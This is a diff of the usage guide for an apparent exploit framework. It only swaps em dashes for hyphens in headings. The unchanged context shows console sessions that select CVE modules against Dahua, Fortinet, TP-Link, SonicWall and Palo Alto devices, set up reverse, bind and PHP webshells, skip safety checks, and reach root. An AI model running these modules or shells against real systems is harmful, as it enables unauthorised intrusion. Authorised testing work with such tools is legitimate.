@@ -150,7 +150,7 @@ Upgrade shell:
 
 ---
 
-### Reverse shell (`nc_mkfifo`) — no `-e` support
+### Reverse shell (`nc_mkfifo`)  -  no `-e` support
 
 ```
 exf (dahua/cctv_rce_cve_2021_36260) > set lhost 10.10.14.22
@@ -171,7 +171,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ---
 
-### Bind shell (`nc_bind`) — no outbound connectivity
+### Bind shell (`nc_bind`)  -  no outbound connectivity
 
 ```
 exf (fortinet/fortios_auth_bypass_cve_2022_40684) > set shell_type nc_bind
@@ -221,7 +221,7 @@ exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > run
 
 ---
 
-### `auto` mode — sequential shell attempts
+### `auto` mode  -  sequential shell attempts
 
 ```
 exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set shell_type auto
@@ -243,7 +243,7 @@ uid=0(root) gid=0(root)
 
 ---
 
-### Webshell (`php_webshell`) — upload and access
+### Webshell (`php_webshell`)  -  upload and access
 
 ```
 exf (cameras/dahua/cctv_firmware_upload_no_verify) > set shell_type php_webshell
@@ -261,20 +261,20 @@ exf (cameras/dahua/cctv_firmware_upload_no_verify) > run
 
 ---
 
-### `force_exploit` — skip `check()`
+### `force_exploit`  -  skip `check()`
 
 ```
 exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > set force_exploit true
 [+] force_exploit => true
 exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > run
 
-[*] force_exploit enabled — skipping check()
+[*] force_exploit enabled  -  skipping check()
 [*] Running module directly...
 ```
 
 ---
 
-### `ask_on_fail` — prompt on negative check
+### `ask_on_fail`  -  prompt on negative check
 
 ```
 exf (paloalto/panos_auth_bypass_cve_2025_0108) > check
